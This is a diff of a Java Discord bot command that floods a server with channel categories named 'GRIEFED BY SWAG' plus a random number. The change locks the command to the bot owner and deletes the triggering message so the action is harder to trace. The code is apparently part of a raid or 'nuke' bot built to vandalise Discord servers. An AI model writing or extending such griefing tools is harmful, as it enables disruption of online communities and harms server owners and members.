@@ -13,17 +13,19 @@ import java.util.Random;
 public class CreateCategoryCommand implements ICommand {
     @Override
     public void handle(List<String> args, GuildMessageReceivedEvent event) {
+        if (!(event.getAuthor().getIdLong() == Core.OWNERID )) {
+            return;
+        }
         try {
             int input = Integer.parseInt(args.get(0));
             for (int i = 0; i < input; i++) {
-                event.getGuild().createCategory("GRIEFED BY POODLECOORP " + (this.getRandom())).queue();
+                event.getGuild().createCategory("GRIEFED BY SWAG " + (this.getRandom())).queue();
                 if (i == input - 1) {
-                    List<Message> messages = event.getChannel().getHistory().retrievePast(2).complete();
-                    event.getChannel().deleteMessages(messages).queue();
-                    EmbedBuilder eb = new EmbedBuilder();
-                    eb.setColor(346626);
-                    eb.setDescription(String.format("✅ Successfully created %s categories(s) ✅", args.get(0)));
-                    event.getChannel().sendMessage(eb.build()).queue();
+                    event.getMessage().delete().queue();
+//                    EmbedBuilder eb = new EmbedBuilder();
+//                    eb.setColor(346626);
+//                    eb.setDescription(String.format("✅ Successfully created %s categories(s) ✅", args.get(0)));
+//                    event.getChannel().sendMessage(eb.build()).queue();
                 }
             }
         } catch (NumberFormatException | IndexOutOfBoundsException ex) {
